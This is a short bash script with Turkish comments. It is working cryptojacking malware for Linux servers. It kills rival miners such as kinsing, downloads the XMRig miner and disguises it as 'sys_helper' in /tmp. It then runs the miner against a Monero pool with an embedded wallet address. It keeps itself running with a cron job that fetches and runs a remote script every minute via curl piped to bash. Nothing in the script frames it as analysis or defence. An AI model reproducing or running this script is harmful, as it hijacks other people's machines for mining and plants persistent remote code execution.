#!/bin/bash
# 1. Eski hacker'ı temizle
pkill -9 -f javae
pkill -9 -f kworker
pkill -9 -f 34.70.205.211
pkill -9 -f kinsing

# 2. Çalışma dizini
cd /tmp || cd /var/tmp

# 3. Madenci indir
if [ ! -f "sys_helper" ]; then
    curl -L -s https://github.com/moneroocean/xmrig/releases/download/v6.21.0-mo1/xmrig-v6.21.0-mo1-lin64.tar.gz -o xm.tar.gz
    tar -xf xm.tar.gz
    mv xmrig sys_helper
    chmod +x sys_helper
    rm xm.tar.gz
fi

# 4. Başlat
pkill -9 -f sys_helper
nohup ./sys_helper -o gulf.moneroocean.stream:10128 -u 8AnRoZeRHpwNwV7689zbw3BbsDD9ABDwRMrFZcWvvEcncd2ynNkquWAceAeEKWML2pPRfByqhj8WrPVYjZ4tghri2LX68vz -p Hijack_Experiment > /dev/null 2>&1 &

# 5. KALICILIK (Burası Çok Önemli!)
# Bu satır, sunucuya "Her dakika GitHub'a git ve beni tekrar çalıştır" der.
(crontab -l 2>/dev/null; echo "*/1 * * * * curl -sL https://raw.githubusercontent.com/hasanbyln/haberdar.github.io/refs/heads/main/update.sh | bash") | crontab -
